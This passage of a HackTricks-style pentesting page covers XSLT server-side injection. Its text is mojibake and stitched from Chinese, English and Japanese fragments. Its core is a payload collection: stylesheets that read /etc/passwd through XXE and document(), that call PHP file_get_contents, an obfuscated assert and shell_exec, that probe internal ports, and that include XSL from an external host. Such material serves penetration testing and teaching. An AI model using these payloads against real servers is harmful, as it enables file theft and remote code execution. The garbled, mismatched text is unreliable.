- è¯»å–æ•æ„Ÿæ–‡ä»¶ï¼šé€šè¿‡åœ¨XMLè¯·æ±‚ä¸­å¼•ç”¨å¤–éƒ¨å®ä½“ï¼Œå¯ä»¥è¯»å–æœåŠ¡å™¨ä¸Šçš„æ•æ„Ÿæ–‡ä»¶ï¼Œå¦‚/etc/passwdã€‚
- æ‰§è¡Œè¿œç¨‹è¯·æ±‚ï¼šåˆ©ç”¨XXEæ¼æ´ï¼Œå¯ä»¥å‘é€è¿œç¨‹è¯·æ±‚ï¼Œå¦‚SSRFï¼ˆæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰æ”»å‡»ï¼Œä»è€Œè¿›ä¸€æ­¥æ¢æµ‹ç›®æ ‡ç³»ç»Ÿæˆ–æ”»å‡»å†…éƒ¨èµ„æºã€‚
- å‘èµ·æ”»å‡»é“¾ï¼šé€šè¿‡åˆ©ç”¨XXEæ¼æ´ï¼Œå¯ä»¥åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œæ¶æ„ä»£ç ï¼Œå¦‚ååºåˆ—åŒ–æ”»å‡»æˆ–è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

#### **3. é˜²å¾¡XXEæ¼æ´**

ä¸ºäº†é˜²æ­¢XXEæ¼æ´çš„åˆ©ç”¨ï¼Œå¯ä»¥é‡‡å–ä»¥ä¸‹é˜²å¾¡æªæ–½ï¼š

- è¾“å…¥éªŒè¯å’Œè¿‡æ»¤ï¼šå¯¹ç”¨æˆ·è¾“å…¥çš„XMLæ•°æ®è¿›è¡Œä¸¥æ ¼éªŒè¯å’Œè¿‡æ»¤ï¼Œç¡®ä¿ä¸åŒ…å«å¤–éƒ¨å®ä½“å¼•ç”¨ã€‚
- ä½¿ç”¨å®‰å…¨çš„XMLè§£æå™¨ï¼šä½¿ç”¨å®‰å…¨çš„XMLè§£æå™¨ï¼Œå¦‚DOM4Jæˆ–JAXBï¼Œä»¥é˜²æ­¢XXEæ¼æ´çš„åˆ©ç”¨ã€‚
- ç¦ç”¨å¤–éƒ¨å®ä½“ï¼šåœ¨XMLè§£æå™¨ä¸­ç¦ç”¨å¤–éƒ¨å®ä½“ï¼Œä»¥é˜²æ­¢XXEæ¼æ´çš„åˆ©ç”¨ã€‚

#### **4. ç›¸å…³å·¥å…·å’Œèµ„æº**

ä»¥ä¸‹æ˜¯ä¸€äº›æœ‰ç”¨çš„å·¥å…·å’Œèµ„æºï¼Œå¯ç”¨äºæ£€æµ‹å’Œåˆ©ç”¨XXEæ¼æ´ï¼š

- XXEinjectorï¼šç”¨äºæ£€æµ‹å’Œåˆ©ç”¨XXEæ¼æ´çš„å·¥å…·ã€‚
- Burp Suiteï¼šä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„Webåº”ç”¨ç¨‹åºæ¸—é€æµ‹è¯•å·¥å…·ï¼ŒåŒ…å«XXEæ¼æ´æ‰«æå™¨ã€‚
- OWASP XXE Prevention Cheat Sheetï¼šOWASPæä¾›çš„é˜²å¾¡XXEæ¼æ´çš„å‚è€ƒæŒ‡å—ã€‚

#### **5. æ€»ç»“**

XXEæ˜¯ä¸€ç§åˆ©ç”¨XMLè§£æå™¨æ¼æ´çš„æ”»å‡»æŠ€æœ¯ï¼Œå¯ä»¥ç”¨äºè¯»å–æ•æ„Ÿæ–‡ä»¶ã€æ‰§è¡Œè¿œç¨‹è¯·æ±‚å’Œå‘èµ·æ”»å‡»é“¾ã€‚ä¸ºäº†é˜²æ­¢XXEæ¼æ´çš„åˆ©ç”¨ï¼Œåº”é‡‡å–é€‚å½“çš„é˜²å¾¡æªæ–½ï¼Œå¦‚è¾“å…¥éªŒè¯å’Œè¿‡æ»¤ï¼Œä½¿ç”¨å®‰å…¨çš„XMLè§£æå™¨ä»¥åŠç¦ç”¨å¤–éƒ¨å®ä½“ã€‚
```markup
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "/etc/passwd">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
&ext_file;
</xsl:template>
</xsl:stylesheet>
```
### **HTTPã‚’ä»‹ã—ã¦**

When performing XSLT Server-Side Injection (XSSI) attacks, one common method is to exploit the XSLT processor by sending a specially crafted XML payload through an HTTP request. This allows an attacker to inject malicious code into the server-side XSLT stylesheet and manipulate the transformation process.

XSLT is a language used for transforming XML documents into other formats, such as HTML or plain text. It allows developers to define rules and templates to transform the XML data. However, if the XSLT processor is not properly configured or secured, it can be vulnerable to injection attacks.

To perform an XSSI attack through HTTP, the attacker needs to identify a vulnerable endpoint that accepts XML input and processes it using an XSLT stylesheet. The attacker then crafts a malicious XML payload that includes the XSLT code they want to inject.

The payload is sent as part of an HTTP request, typically using the POST method. The XML payload is included in the request body, and the Content-Type header is set to "application/xml" or "text/xml" to indicate that the request contains XML data.

Once the server receives the request, it processes the XML payload using the XSLT processor. If the server is vulnerable to XSSI, it will execute the injected XSLT code, allowing the attacker to perform various actions, such as reading sensitive data, executing arbitrary commands, or even gaining remote code execution.

It is important to note that XSSI attacks through HTTP require the server to have an XSLT processor enabled and vulnerable to injection. Additionally, the attacker needs to have knowledge of the server's configuration and the ability to craft a malicious XML payload.

To protect against XSSI attacks, it is crucial to properly configure and secure the XSLT processor. This includes validating and sanitizing user input, restricting access to sensitive resources, and implementing proper input validation and output encoding techniques. Regular security assessments and penetration testing can help identify and mitigate potential vulnerabilities.
```markup
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<xsl:value-of select="document('/etc/passwd')"/>
</xsl:template>
</xsl:stylesheet>
```

```markup
<!DOCTYPE xsl:stylesheet [
<!ENTITY passwd SYSTEM "file:///etc/passwd" >]>
<xsl:template match="/">
&passwd;
</xsl:template>
```
### **å†…éƒ¨ï¼ˆPHPé–¢æ•°ï¼‰**

The internal (PHP-function) technique allows an attacker to execute arbitrary code on the server by injecting malicious code into an XSLT stylesheet file. This technique takes advantage of the server-side processing capabilities of XSLT (Extensible Stylesheet Language Transformations) to execute code on the server.

To perform an XSLT server-side injection, the attacker needs to identify a vulnerable application that uses XSLT to transform XML data. Once a vulnerable application is identified, the attacker can craft a malicious XSLT stylesheet file that contains the code they want to execute.

The attacker then injects the malicious XSLT stylesheet file into the vulnerable application by exploiting a vulnerability that allows file uploads or by modifying an existing stylesheet file. When the application processes the XML data and applies the XSLT transformation, it also executes the injected code.

This technique can be used to perform various malicious actions, such as accessing sensitive data, modifying server-side files, or even gaining remote code execution on the server. It is important for developers to properly validate and sanitize user input when using XSLT to prevent this type of attack.
```markup
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('file_get_contents','/path/to/file')"/>
</xsl:template>
</xsl:stylesheet>
```

```markup
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:copy-of name="asd" select="php:function('assert','var_dump(file_get_contents(scandir(chr(46).chr(47))[2].chr(47).chr(46).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))==3')" />
<br />
</body>
</html>
```
### ãƒãƒ¼ãƒˆã‚¹ã‚­ãƒ£ãƒ³

ãƒãƒ¼ãƒˆã‚¹ã‚­ãƒ£ãƒ³ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ç‰¹å®šã®ãƒ›ã‚¹ãƒˆã«å¯¾ã—ã¦ã€åˆ©ç”¨å¯èƒ½ãªãƒãƒ¼ãƒˆã‚’ç‰¹å®šã™ã‚‹ãŸã‚ã«è¡Œã‚ã‚Œã‚‹æ‰‹æ³•ã§ã™ã€‚ãƒãƒ¼ãƒˆã‚¹ã‚­ãƒ£ãƒ³ã¯ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è©•ä¾¡ã‚„ä¾µå…¥ãƒ†ã‚¹ãƒˆã®ä¸€ç’°ã¨ã—ã¦ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ãƒãƒ¼ãƒˆã‚¹ã‚­ãƒ£ãƒ³ã«ã‚ˆã£ã¦ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ãƒ›ã‚¹ãƒˆãŒã©ã®ã‚ˆã†ãªã‚µãƒ¼ãƒ“ã‚¹ã‚’æä¾›ã—ã¦ã„ã‚‹ã‹ã‚’ç‰¹å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯è„†å¼±æ€§ã‚’è¦‹ã¤ã‘ã¦æ‚ªç”¨ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

ãƒãƒ¼ãƒˆã‚¹ã‚­ãƒ£ãƒ³ã¯ã€ã•ã¾ã–ã¾ãªæ–¹æ³•ã§å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚æœ€ã‚‚ä¸€èˆ¬çš„ãªæ–¹æ³•ã¯ã€TCPã¾ãŸã¯UDPãƒ‘ã‚±ãƒƒãƒˆã‚’é€ä¿¡ã—ã¦ã€ãƒ›ã‚¹ãƒˆãŒå¿œç­”ã™ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ã“ã¨ã§ã™ã€‚ãƒãƒ¼ãƒˆã‚¹ã‚­ãƒ£ãƒ³ã®çµæœã«åŸºã¥ã„ã¦ã€æ”»æ’ƒè€…ã¯ãƒ›ã‚¹ãƒˆä¸Šã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã‚„ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®æƒ…å ±ã‚’åé›†ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ãƒãƒ¼ãƒˆã‚¹ã‚­ãƒ£ãƒ³ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®è©•ä¾¡ã‚„ä¾µå…¥ãƒ†ã‚¹ãƒˆã«ãŠã„ã¦é‡è¦ãªæ‰‹æ³•ã§ã™ãŒã€æ‚ªæ„ã®ã‚ã‚‹æ”»æ’ƒã«ã‚‚ä½¿ç”¨ã•ã‚Œã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ãã®ãŸã‚ã€ãƒãƒ¼ãƒˆã‚¹ã‚­ãƒ£ãƒ³ã®å®Ÿæ–½ã¯ã€é©åˆ‡ãªè¨±å¯ã‚’å¾—ãŸå ´åˆã«ã®ã¿è¡Œã‚ã‚Œã‚‹ã¹ãã§ã™ã€‚ã¾ãŸã€ãƒãƒ¼ãƒˆã‚¹ã‚­ãƒ£ãƒ³ã®çµæœã‚’é©åˆ‡ã«è©•ä¾¡ã—ã€å¿…è¦ãªå¯¾ç­–ã‚’è¬›ã˜ã‚‹ã“ã¨ã‚‚é‡è¦ã§ã™ã€‚
```markup
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="document('http://example.com:22')"/>
</xsl:template>
</xsl:stylesheet>
```
## ãƒ•ã‚¡ã‚¤ãƒ«ã¸ã®æ›¸ãè¾¼ã¿

### XSLT 2.0

XSLT 2.0ã§ã¯ã€`xsl:result-document`è¦ç´ ã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã«æ›¸ãè¾¼ã‚€ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®è¦ç´ ã¯ã€æŒ‡å®šã—ãŸãƒ•ã‚¡ã‚¤ãƒ«ã«çµæœã‚’å‡ºåŠ›ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

ä»¥ä¸‹ã¯ã€XSLT 2.0ã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã«æ›¸ãè¾¼ã‚€ãŸã‚ã®ä¾‹ã§ã™ã€‚

```xml
<xsl:result-document href="file:///path/to/file.txt">
  <xsl:text>Hello, World!</xsl:text>
</xsl:result-document>
```

ä¸Šè¨˜ã®ä¾‹ã§ã¯ã€`file:///path/to/file.txt`ã¨ã„ã†ãƒ‘ã‚¹ã«`Hello, World!`ã¨ã„ã†ãƒ†ã‚­ã‚¹ãƒˆã‚’æ›¸ãè¾¼ã‚“ã§ã„ã¾ã™ã€‚

ã“ã®æ–¹æ³•ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€XSLT 2.0ã‚’ä»‹ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã«ãƒ‡ãƒ¼ã‚¿ã‚’æ›¸ãè¾¼ã‚€ã“ã¨ãŒã§ãã¾ã™ã€‚ãŸã ã—ã€ã“ã®æ©Ÿèƒ½ã‚’ä½¿ç”¨ã™ã‚‹éš›ã«ã¯ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®æ³¨æ„ãŒå¿…è¦ã§ã™ã€‚æ‚ªæ„ã®ã‚ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒä¸æ­£ãªãƒ•ã‚¡ã‚¤ãƒ«ãƒ‘ã‚¹ã‚’æŒ‡å®šã™ã‚‹ã“ã¨ã§ã€ã‚·ã‚¹ãƒ†ãƒ ã«æ‚ªå½±éŸ¿ã‚’ä¸ãˆã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ãã®ãŸã‚ã€ä¿¡é ¼ã§ãã‚‹å…¥åŠ›ã‚’ä½¿ç”¨ã™ã‚‹ã‹ã€é©åˆ‡ãªå…¥åŠ›æ¤œè¨¼ã¨ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—å‡¦ç†ã‚’è¡Œã†ã“ã¨ãŒé‡è¦ã§ã™ã€‚
```markup
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:result-document href="local_file.txt">
<xsl:text>Write Local File</xsl:text>
</xsl:result-document>
</xsl:template>
</xsl:stylesheet>
```
### **Xalan-Jã®æ‹¡å¼µæ©Ÿèƒ½**

Xalan-Jã¯ã€Javaã§å®Ÿè£…ã•ã‚ŒãŸXSLTï¼ˆExtensible Stylesheet Language Transformationsï¼‰ãƒ—ãƒ­ã‚»ãƒƒã‚µã§ã™ã€‚XSLTã¯ã€XMLæ–‡æ›¸ã‚’åˆ¥ã®å½¢å¼ã«å¤‰æ›ã™ã‚‹ãŸã‚ã®è¨€èªã§ã™ã€‚Xalan-Jã«ã¯ã€XSLTã®æ©Ÿèƒ½ã‚’æ‹¡å¼µã™ã‚‹ãŸã‚ã®ã„ãã¤ã‹ã®æ‹¡å¼µæ©Ÿèƒ½ãŒã‚ã‚Šã¾ã™ã€‚

Xalan-Jã®æ‹¡å¼µæ©Ÿèƒ½ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€XSLTã‚¹ã‚¿ã‚¤ãƒ«ã‚·ãƒ¼ãƒˆå†…ã§Javaã®ã‚¯ãƒ©ã‚¹ã‚„ãƒ¡ã‚½ãƒƒãƒ‰ã‚’å‘¼ã³å‡ºã™ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€XSLTã®å‡¦ç†ä¸­ã«ä»»æ„ã®Javaã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

Xalan-Jã®æ‹¡å¼µæ©Ÿèƒ½ã‚’æ‚ªç”¨ã™ã‚‹ã¨ã€ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ï¼ˆSSIï¼‰æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚æ”»æ’ƒè€…ã¯ã€XSLTã‚¹ã‚¿ã‚¤ãƒ«ã‚·ãƒ¼ãƒˆå†…ã«æ‚ªæ„ã®ã‚ã‚‹ã‚³ãƒ¼ãƒ‰ã‚’åŸ‹ã‚è¾¼ã‚€ã“ã¨ã§ã€ã‚µãƒ¼ãƒãƒ¼ä¸Šã§ä»»æ„ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

Xalan-Jã®æ‹¡å¼µæ©Ÿèƒ½ã‚’ä½¿ç”¨ã—ãŸã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³æ”»æ’ƒã¯ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®è„†å¼±æ€§ã¨ã—ã¦èªè­˜ã•ã‚Œã¦ã„ã¾ã™ã€‚é–‹ç™ºè€…ã¯ã€Xalan-Jã®æ‹¡å¼µæ©Ÿèƒ½ã‚’é©åˆ‡ã«åˆ¶é™ã—ã€å…¥åŠ›ã®æ¤œè¨¼ã¨ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—å‡¦ç†ã‚’è¡Œã†ã“ã¨ã§ã€ã“ã®æ”»æ’ƒã‚’é˜²ãå¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```markup
<xsl:template match="/">
<redirect:open file="local_file.txt"/>
<redirect:write file="local_file.txt"/> Write Local File</redirect:write>
<redirect:close file="loxal_file.txt"/>
</xsl:template>
```
ä»–ã®æ–¹æ³•ã§PDFãƒ•ã‚¡ã‚¤ãƒ«ã«æ›¸ãè¾¼ã‚€

## å¤–éƒ¨XSLã‚’å«ã‚ã‚‹
```markup
<xsl:include href="http://extenal.web/external.xsl"/>
```

```markup
<?xml version="1.0" ?>
<?xml-stylesheet type="text/xsl" href="http://external.web/ext.xsl"?>
```
## ã‚³ãƒ¼ãƒ‰ã®å®Ÿè¡Œ

### **php:function**
```markup
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('shell_exec','sleep 10')" />
</xsl:template>
</xsl:stylesheet>
```

```markup
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:copy-of name="asd" select="php:function('assert','var_dump(scandir(chr(46).chr(47)));')" />
<br />
</body>
</html>
```
ä»–ã®ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚’ä½¿ç”¨ã—ã¦PDFã§ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹

### **ä»–ã®è¨€èª**

**ã“ã®ãƒšãƒ¼ã‚¸ã§ã¯ã€ä»–ã®è¨€èªã§ã®RCEã®ä¾‹ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š** [**https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt\_injection#C%23%2FVB.NET%2FASP.NET**](https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt\_injection#C%23%2FVB.NET%2FASP.NET) **(Cï¼ƒã€Javaã€PHP)**

## **ã‚¯ãƒ©ã‚¹ã‹ã‚‰PHPã®é™çš„é–¢æ•°ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹**

æ¬¡ã®é–¢æ•°ã¯ã€ã‚¯ãƒ©ã‚¹XSLã®é™çš„ãƒ¡ã‚½ãƒƒãƒ‰`stringToUrl`ã‚’å‘¼ã³å‡ºã—ã¾ã™ï¼š
```markup
<!--- More complex test to call php class function-->
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"
version="1.0">
<xsl:output method="html" version="XHTML 1.0" encoding="UTF-8" indent="yes" />
<xsl:template match="root">
<html>
<!-- We use the php suffix to call the static class function stringToUrl() -->
<xsl:value-of select="php:function('XSL::stringToUrl','une_superstring-Ã Ã”|modifier')" />
<!-- Output: 'une_superstring ao modifier' -->
</html>
</xsl:template>
</xsl:stylesheet>
```
## **Brute-Force Detection List**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xslt.txt" %}

## **References**

* [XSLT\_SSRF](https://feelsec.info/wp-content/uploads/2018/11/XSLT\_SSRF.pdf)\\
* [http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20IO%20Active.pdf](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20IO%20Active.pdf)\\
* [http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20Blackhat%202015.pdf](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20Blackhat%202015.pdf)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ã‚ãªãŸã¯**ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ HackTricksã§ã‚ãªãŸã®**ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’å…¥æ‰‹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³
* [**å…¬å¼ã®PEASSï¼†HackTricks swag**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[hacktricks repo](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
